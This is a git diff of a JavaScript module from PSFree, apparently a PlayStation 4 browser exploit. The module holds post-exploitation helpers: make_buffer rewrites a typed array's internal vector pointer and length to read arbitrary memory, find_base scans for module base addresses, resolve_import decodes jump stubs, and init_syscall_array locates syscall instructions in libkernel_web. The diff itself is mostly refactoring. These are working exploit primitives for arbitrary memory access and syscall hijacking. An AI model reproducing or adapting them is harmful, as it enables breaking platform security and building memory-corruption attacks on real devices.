@@ -1,4 +1,4 @@
-/* Copyright (C) 2023-2024 anonymous
+/* Copyright (C) 2023-2025 anonymous
 
 This file is part of PSFree.
 
@@ -18,13 +18,13 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // This module are for utilities that depend on running the exploit first
 
 import { Int } from './int64.mjs';
-import { Addr, mem } from './mem.mjs';
+import { mem } from './mem.mjs';
 import { align } from './utils.mjs';
-import { KB } from './constants.mjs';
-import { read32 } from './rw.mjs';
+import { page_size } from './offset.mjs';
+import { BufferView } from './rw.mjs';
+import { View1 } from './view.mjs';
 
-import * as rw from './rw.mjs';
-import * as o from './offset.mjs';
+import * as off from './offset.mjs';
 
 // creates an ArrayBuffer whose contents is copied from addr
 export function make_buffer(addr, size) {
@@ -53,11 +53,11 @@ export function make_buffer(addr, size) {
     const u_addr = mem.addrof(u);
 
     // we won't change the butterfly and m_mode so we won't save those
-    const old_addr = u_addr.read64(o.view_m_vector);
-    const old_size = u_addr.read32(o.view_m_length);
+    const old_addr = u_addr.read64(off.view_m_vector);
+    const old_size = u_addr.read32(off.view_m_length);
 
-    u_addr.write64(o.view_m_vector, addr);
-    u_addr.write32(o.view_m_length, size);
+    u_addr.write64(off.view_m_vector, addr);
+    u_addr.write32(off.view_m_length, size);
 
     const copy = new Uint8Array(u.length);
     copy.set(u);
@@ -76,8 +76,8 @@ export function make_buffer(addr, size) {
     const res = copy.buffer;
 
     // restore
-    u_addr.write64(o.view_m_vector, old_addr);
-    u_addr.write32(o.view_m_length, old_size);
+    u_addr.write64(off.view_m_vector, old_addr);
+    u_addr.write32(off.view_m_length, old_size);
 
     return res;
 }
@@ -87,8 +87,8 @@ function check_magic_at(p, is_text) {
     // byte sequence that is very likely to appear at offset 0 of a .text
     // segment
     const text_magic = [
-        new Int([0x55, 0x48, 0x89, 0xe5, 0x41, 0x57, 0x41, 0x56]),
-        new Int([0x41, 0x55, 0x41, 0x54, 0x53, 0x50, 0x48, 0x8d]),
+        new Int(0xe5894855, 0x56415741),
+        new Int(0x54415541, 0x8d485053),
     ];
 
     // the .data "magic" is just a portion of the PT_SCE_MODULE_PARAM segment
@@ -137,8 +137,6 @@ function check_magic_at(p, is_text) {
 // addr.read8(-1);
 //
 export function find_base(addr, is_text, is_back) {
-    // ps4 page size
-    const page_size = 16 * KB;
     // align to page size
     addr = align(addr, page_size);
     const offset = (is_back ? -1 : 1) * page_size;
@@ -146,7 +144,7 @@ export function find_base(addr, is_text, is_back) {
         if (check_magic_at(addr, is_text)) {
             break;
         }
-        addr = addr.add(offset)
+        addr = addr.add(offset);
     }
     return addr;
 }
@@ -156,27 +154,27 @@ export function get_view_vector(view) {
     if (!ArrayBuffer.isView(view)) {
         throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
     }
-    return mem.addrof(view).readp(o.view_m_vector);
+    return mem.addrof(view).readp(off.view_m_vector);
 }
 
 export function resolve_import(import_addr) {
     if (import_addr.read16(0) !== 0x25ff) {
         throw Error(
             `instruction at ${import_addr} is not of the form: jmp qword`
-            + ' [rip + X]'
-        );
+            + ' [rip + X]');
     }
     // module_function_import:
     //     jmp qword [rip + X]
     //     ff 25 xx xx xx xx // signed 32-bit displacement
     const disp = import_addr.read32(2);
-    // sign extend
-    const offset = new Int(disp, disp >> 31);
+    // assume disp and offset are 32-bit integers
+    // x | 0 will always be a signed integer
+    const offset = (disp | 0) + 6;
     // The rIP value used by "jmp [rip + X]" instructions is actually the rIP
     // of the next instruction. This means that the actual address used is
     // [rip + X + sizeof(jmp_insn)], where sizeof(jmp_insn) is the size of the
     // jump instruction, which is 6 in this case.
-    const function_addr = import_addr.readp(offset.add(6));
+    const function_addr = import_addr.readp(offset);
 
     return function_addr;
 }
@@ -186,8 +184,9 @@ export function init_syscall_array(
     libkernel_web_base,
     max_search_size,
 ) {
-    if (typeof max_search_size !== 'number') {
-        throw TypeError(`max_search_size is not a number: ${max_search_size}`);
+    if (!Number.isInteger(max_search_size)) {
+        throw TypeError(
+            `max_search_size is not a integer: ${max_search_size}`);
     }
     if (max_search_size < 0) {
         throw Error(`max_search_size is less than 0: ${max_search_size}`);
@@ -197,7 +196,7 @@ export function init_syscall_array(
         libkernel_web_base,
         max_search_size,
     );
-    const kbuf = new Uint8Array(libkernel_web_buffer);
+    const kbuf = new BufferView(libkernel_web_buffer);
 
     // Search 'rdlo' string from libkernel_web's .rodata section to gain an
     // upper bound on the size of the .text section.
@@ -217,8 +216,7 @@ export function init_syscall_array(
     if (!found) {
         throw Error(
             '"rdlo" string not found in libkernel_web, base address:'
-            + ` ${libkernel_web_base}`
-        );
+            + ` ${libkernel_web_base}`);
     }
 
     // search for the instruction sequence:
@@ -236,10 +234,23 @@ export function init_syscall_array(
             && kbuf[i + 10] === 0x0f
             && kbuf[i + 11] === 0x05
         ) {
-            const syscall_num = read32(kbuf, i + 3);
+            const syscall_num = kbuf.read32(i + 3);
             syscall_array[syscall_num] = libkernel_web_base.add(i);
             // skip the sequence
             i += 11;
         }
     }
 }
+
+// create a char array like in the C language
+//
+// string to view since it's easier to get the address of the buffer this way
+export function cstr(str) {
+    str += '\0';
+    return View1.from(str, c => c.codePointAt(0));
+}
+
+// we are re-exporting this since users that want to use cstr() usually want
+// jstr() as well. they are likely working with functions that take/return
+// strings
+export { jstr } from './utils.mjs';
